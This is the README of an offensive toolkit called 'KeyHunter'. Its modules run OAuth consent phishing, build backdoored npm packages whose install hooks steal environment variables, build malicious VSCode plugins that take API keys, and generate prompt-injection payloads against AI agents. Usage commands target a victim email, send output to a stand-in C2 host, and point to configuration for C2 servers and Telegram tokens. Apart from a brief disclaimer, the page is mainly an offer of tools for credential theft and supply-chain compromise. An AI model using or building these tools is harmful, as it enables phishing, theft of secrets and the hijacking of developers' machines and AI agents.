# KeyHunter Penetration Testing Modules

These modules are designed for authorized security testing and red team engagements.

## Available Modules

| Module | Description |
|--------|-------------|
| oauth_consent | Generate OAuth consent phishing link, capture authorization code. |
| npm_backdoor | Generate malicious npm package with pre/postinstall hooks to steal env variables. |
| ide_plugin | Generate malicious VSCode plugin that steals API keys from config. |
| prompt_injection | Generate payloads to inject into AI Agents (PR titles, issue comments). |

## Usage

bash
'''
# List modules
python test.py --list

# Execute OAuth consent phishing (target victim email)
python test.py --module oauth_consent --target victim@example.com

# Generate npm backdoor package
python test.py --module npm_backdoor --output ./evil_package --params '{"c2_host":"your-c2.com"}'

# Generate malicious IDE plugin
python test.py --module ide_plugin --output ./evil_plugin

# Generate prompt injection payloads
python test.py --module prompt_injection --target https://github.com/org/repo
'''
Configuration

Edit config/settings.py to set C2 servers, Telegram tokens, etc.

Disclaimer

These tools are for educational and authorized testing purposes only. Unauthorized use is illegal.


